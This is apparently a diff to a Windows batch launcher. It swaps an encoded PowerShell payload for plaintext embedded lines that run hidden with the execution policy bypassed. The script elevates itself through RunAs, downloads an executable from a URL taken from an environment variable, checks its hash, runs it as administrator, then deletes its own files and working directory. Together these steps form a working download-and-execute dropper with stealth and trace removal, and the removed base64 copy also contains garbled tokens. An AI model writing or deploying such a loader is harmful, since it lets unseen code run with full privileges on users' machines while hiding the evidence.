@@ -12,10 +12,118 @@ set "RUNNER_BAT=%~f0"
 
 if not exist "%WORK_DIR%" mkdir "%WORK_DIR%" >nul 2>&1
 
-set "B64=JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTdG9wJw0KW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMg0KDQokdSA9ICRlbnY6VVJMDQokaCA9ICRlbnY6SEFTSC5Ub0xvd2VySW52YXJpYW50KCkNCiRkaXIgPSAkZW52OldPUktfRElSDQokZiA9ICRlbnY6T1VUDQokbG9nID0gJGVudjpMT0cNCiRwc0ZpbGUgPSAkZW52OlBTX1NDUklQVA0KJHJ1bm5lciA9ICRlbnY6UlVOTkVSX0JBVA0KDQpmdW5jdGlvbiBXcml0ZS1Mb2coW3N0cmluZ10kTXNnKSB7DQogICAgJGxpbmUgPSAnWzBdezEgfSdcdScgLWYgKEdldC1EYXRlIC1Gb3JtYXQgJ0hIOm1tOnNzJyksICRNc2cNCiAgICAkbnVsbCA9IEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAkbGluZSAtRW5jb2RpbmcgVVRGOCAtUGFzc1RocnUNCn0NCg0KZnVuY3Rpb24gR2V0LUZpbGVGcm9tVXJsKFtzdHJpbmdbJFRhcmdldFVybCwgW3N0cmluZ10kT3V0RmlsZSkgew0KICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRPdXRGaWxlKSB7DQogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkT3V0RmlsZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9DQogICAgdHJ5IHsNCiAgICAgICAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkVGFyZ2V0VXJsIC1PdXRGaWxlICRPdXRGaWxlIC1Vc2VCYXNpY1BhcnNpbmcNCiAgICAgICAgaWYgKChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRPdXRGaWxlKSAtYW5kICgoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICRPdXRGaWxlKS5MZW5ndGggLWd0IDApKSB7DQogICAgICAgICAgICByZXR1cm4gJHRydWUNCiAgICAgICAgfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBXcml0ZS1Mb2cgKCdJbnZva2UtV2ViUmVxdWVzdCBlcnJvcjogJyArICRfLkV4Y2VwdGlvbi5NZXNzYWdlKQ0KICAgIH0NCiAgICB0cnkgew0KICAgICAgICAkd2MgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50DQogICAgICAgICR3Yy5Eb3dubG9hZEZpbGUoJFRhcmdldFVybCwgJE91dEZpbGUpDQogICAgICAgICR3Yy5EaXNwb3NlKCkNCiAgICAgICAgaWYgKChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRPdXRGaWxlKSAtYW5kICgoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICRPdXRGaWxlKS5MZW5ndGggLWd0IDApKSB7DQogICAgICAgICAgICByZXR1cm4gJHRydWUNCiAgICAgICAgfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBXcml0ZS1Mb2cgKCdXZWJDbGllbnQgZXJyb3I6ICcgKyAkXy5FeGNlcHRpb24uTWVzc2FnZSkNCiAgICB9DQogICAgcmV0dXJuICRmYWxzZQ0KfQ0KDQokaWQgPSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKQ0KJHByID0gTmV3LU9iamVjdCBTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbCgkaWQpDQokaXNBZG1pbiA9ICRwc i5Jc0luUm9sZShbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV06OkFkbWluaXN0cmF0b3IpDQoNCmlmICgtbm90ICRpc0FkbWluKSB7DQogICAgV3JpdGUtTG9nICdFbGV2YXRpbmcgd29ya2VyIHByb2Nlc3MgdmlhIFJ1bkFzJw0KICAgICRhcmdzID0gQCAoJy1Ob1Byb2ZpbGUnLCAnLU5vbkludGVyYWN0aXZlJywgJy1FeGVjdXRpb25Qb2xpY3knLCAnQnlwYXNzJywgJy1XaW5kb3dTdHlsZScsICdIaWRkZW4nLCAnLUZpbGUnLCAoJyIiJyArICRwc0ZpbGUgKyAnIiIiJykpDQogICAgJHBzaSA9IE5ldy1PYmplY3QgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NTdGFydEluZm8NCiAgICAkcHNpLkZpbGVOYW1lID0gJ3Bvd2Vyc2hlbGwuZXhlJw0KICAgICRwcy5Bcmd1bWVudHMgPSAnLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRmlsZSAiJyArICRwc0ZpbGUgKyAnIiINCiAgICAkcHNpLlZlcmIgPSAnUnVuQXMnDQogICAgJHBzaS5Vc2VTaGVsbEV4ZWN1dGUgPSAkdHJ1ZQ0KICAgICRwcy5XaW5kb3dTdHlsZSA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1dpbmRvd1N0eWxlXTo6SGlkZGVuDQogICAgJG51bGwgPSBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpTdGFydCgkcHNpKQ0KICAgIGV4aXQgMA0KfQ0KDQp0cnkgew0KICAgIFdyaXRlLUxvZyAoJ0FkbWluIHdvcmtlciBzdGFydGVkLiBVUkw9JyArICR1KQ0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkaXIpKSB7DQogICAgICAgICRubWtkID0gTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkZGlyIC1Gb3JjZQ0KICAgIH0NCg0KICAgICRyZXRyaWVzID0gMg0KICAgICR2ZXJpZmllZCA9ICRmYWxzZQ0KDQogICAgZm9yICgkYSA9IDA7ICRhIC1sZSAkcmV0cmllczsgJGErKykgew0KICAgICAgICBXcml0ZS1Mb2cgKCdEb3dubG9hZCBhdHRlbXB0ICcgKyAoJGEgKyAxKSArICcgb2YgJyArICgkcmV0cmllcyArIDEpKQ0KICAgICAgICAkb2sgPSBHZXQtRmlsZUZyb21VcmwgLVRhcmdldFVybCAkdSAtT3V0RmlsZSAkZg0KICAgICAgICBpZiAoLW5vdCAkb2spIHsNCiAgICAgICAgICAgIFdyaXRlLUxvZyAnRG93bmxvYWQgZmFpbGVkJw0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgfQ0KICAgICAgICAkYWN0dWFsID0gKEdldC1GaWxlSGFzaCAtTGl0ZXJhbFBhdGggJGYgLUFsZ29yaXRobSBTSEEyNTYpLkhhc2guVG9Mb3dlckludmFyaWFudCgpDQogICAgICAgIGlmICgkYWN0dWFsIC1lcSAkaCkgew0KICAgICAgICAgICAgV3JpdGUtTG9nICdTSEEyNTYgbWF0Y2gnDQogICAgICAgICAgICAkdmVyaWZpZWQgPSAkdHJ1ZQ0KICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIFdyaXRlLUxvZyAoJ1NIQTI1NiBtaXNtYXRjaC4gRXhwZWN0ZWQ9JyArICRoICsgJyBHb3Q9JyArICRhY3R1YWwpDQogICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGYgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRsb0NvbnRpbnVlDQogICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAoLW5vdCAkdmVyaWZpZWQpIHsNCiAgICAgICAgV3JpdGUtTG9nICdIYXNoIHZlcmlmaWNhdGlvbiBmYWlsZWQgYWZ0ZXIgcmV0cmllcyINCiAgICAgICAgZXhpdCAyDQogICAgfQ0KDQogICAgV3JpdGUtTG9nICdMYXVuY2hpbmcgdGFyZ2V0IGV4ZWN1dGFibGUgYXMgYWRtaW5pc3RyYXRvcicNCiAgICAkcHJvYyA9IFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRmIC1WZXJiIFJ1bkFzIC1QYXNzVGhydSAtV2FpdA0KICAgIFdyaXRlLUxvZyAoJ1RhcmdldCBleGl0IGNvZGU6ICcgKyAkcHJvYy5FeGl0Q29kZSkNCiAgICBleGl0IFtpbnRdJHByb2MuRXhpdENvZGUNCn0gY2F0Y2ggew0KICAgIFdyaXRlLUxvZyAoJ0ZhdGFsIGVycm9yOiAnICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UpDQogICAgZXhpdCA5OQ0KfSBmaW5hbGx5IHsNCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAyDQogICAgaWYgKCRkaXIgLWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZGlyKSkgew0KICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGRpciAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9DQogICAgaWYgKCRydW5uZXIgLWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkcnVubmVyKSkgew0KICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHJ1bm5lciAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9DQogICAgaWYgKCRwc0ZpbGUgLWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkcHNGaWxlKSkgew0KICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHBzRmlsZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9DQp9"
+powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$lines = Get-Content -LiteralPath $env:RUNNER_BAT | Where-Object { $_ -like '::PS:: *' } | ForEach-Object { $_.Substring(8) }; [IO.File]::WriteAllLines($env:PS_SCRIPT, $lines, (New-Object System.Text.UTF8Encoding($false)))" >nul 2>&1
 
-powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$bytes=[Convert]::FromBase64String($env:B64); [IO.File]::WriteAllBytes($env:PS_SCRIPT, $bytes)" >nul 2>&1
 if not exist "%PS_SCRIPT%" exit /b 1
 
 start "" /b powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_SCRIPT%"
 exit /b 0
+
+::PS:: $ErrorActionPreference = 'Stop'
+::PS:: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+::PS::
+::PS:: $u = $env:URL
+::PS:: $h = $env:HASH.ToLowerInvariant()
+::PS:: $dir = $env:WORK_DIR
+::PS:: $f = $env:OUT
+::PS:: $log = $env:LOG
+::PS:: $psFile = $env:PS_SCRIPT
+::PS:: $runner = $env:RUNNER_BAT
+::PS::
+::PS:: function Write-Log([string]$Msg) {
+::PS::     $line = '[{0}] {1}' -f (Get-Date -Format 'HH:mm:ss'), $Msg
+::PS::     $null = Add-Content -LiteralPath $log -Value $line -Encoding UTF8 -PassThru
+::PS:: }
+::PS::
+::PS:: function Get-FileFromUrl([string]$TargetUrl, [string]$OutFile) {
+::PS::     if (Test-Path -LiteralPath $OutFile) {
+::PS::         Remove-Item -LiteralPath $OutFile -Force -ErrorAction SilentlyContinue
+::PS::     }
+::PS::     try {
+::PS::         Invoke-WebRequest -Uri $TargetUrl -OutFile $OutFile -UseBasicParsing
+::PS::         if ((Test-Path -LiteralPath $OutFile) -and ((Get-Item -LiteralPath $OutFile).Length -gt 0)) {
+::PS::             return $true
+::PS::         }
+::PS::     } catch {
+::PS::         Write-Log ('Invoke-WebRequest error: ' + $_.Exception.Message)
+::PS::     }
+::PS::     try {
+::PS::         $wc = New-Object System.Net.WebClient
+::PS::         $wc.DownloadFile($TargetUrl, $OutFile)
+::PS::         $wc.Dispose()
+::PS::         if ((Test-Path -LiteralPath $OutFile) -and ((Get-Item -LiteralPath $OutFile).Length -gt 0)) {
+::PS::             return $true
+::PS::         }
+::PS::     } catch {
+::PS::         Write-Log ('WebClient error: ' + $_.Exception.Message)
+::PS::     }
+::PS::     return $false
+::PS:: }
+::PS::
+::PS:: $id = [Security.Principal.WindowsIdentity]::GetCurrent()
+::PS:: $pr = New-Object Security.Principal.WindowsPrincipal($id)
+::PS:: $isAdmin = $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+::PS::
+::PS:: if (-not $isAdmin) {
+::PS::     Write-Log 'Elevating worker process via RunAs'
+::PS::     $psi = New-Object System.Diagnostics.ProcessStartInfo
+::PS::     $psi.FileName = 'powershell.exe'
+::PS::     $psi.Arguments = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $psFile + '"'
+::PS::     $psi.Verb = 'RunAs'
+::PS::     $psi.UseShellExecute = $true
+::PS::     $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+::PS::     $null = [System.Diagnostics.Process]::Start($psi)
+::PS::     exit 0
+::PS:: }
+::PS::
+::PS:: try {
+::PS::     Write-Log ('Admin worker started. URL=' + $u)
+::PS::     if (-not (Test-Path -LiteralPath $dir)) {
+::PS::         $null = New-Item -ItemType Directory -Path $dir -Force
+::PS::     }
+::PS::
+::PS::     $retries = 2
+::PS::     $verified = $false
+::PS::
+::PS::     for ($i = 0; $i -le $retries; $i++) {
+::PS::         Write-Log ('Attempt ' + ($i + 1) + ' of ' + ($retries + 1))
+::PS::         $ok = Get-FileFromUrl -TargetUrl $u -OutFile $f
+::PS::         if (-not $ok) {
+::PS::             Write-Log 'Download failed'
+::PS::             continue
+::PS::         }
+::PS::         $actual = (Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash.ToLowerInvariant()
+::PS::         if ($actual -eq $h) {
+::PS::             Write-Log 'SHA-256 match'
+::PS::             $verified = $true
+::PS::             break
+::PS::         } else {
+::PS::             Write-Log ('SHA-256 mismatch. Expected=' + $h + ' Got=' + $actual)
+::PS::             Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue
+::PS::         }
+::PS::     }
+::PS::
+::PS::     if (-not $verified) {
+::PS::         Write-Log 'Hash verification failed after retries'
+::PS::         exit 2
+::PS::     }
+::PS::
+::PS::     Write-Log 'Launching target executable as administrator'
+::PS::     $proc = Start-Process -FilePath $f -Verb RunAs -PassThru -Wait
+::PS::     Write-Log ('Target exit code: ' + $proc.ExitCode)
+::PS::     exit [int]$proc.ExitCode
+::PS:: } catch {
+::PS::     Write-Log ('Fatal error: ' + $_.Exception.Message)
+::PS::     exit 99
+::PS:: } finally {
+::PS::     Start-Sleep -Seconds 2
+::PS::     if ($dir -and (Test-Path -LiteralPath $dir)) {
+::PS::         Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
+::PS::     }
+::PS::     if ($runner -and (Test-Path -LiteralPath $runner)) {
+::PS::         Remove-Item -LiteralPath $runner -Force -ErrorAction SilentlyContinue
+::PS::     }
+::PS::     if ($psFile -and (Test-Path -LiteralPath $psFile)) {
+::PS::         Remove-Item -LiteralPath $psFile -Force -ErrorAction SilentlyContinue
+::PS::     }
+::PS:: }
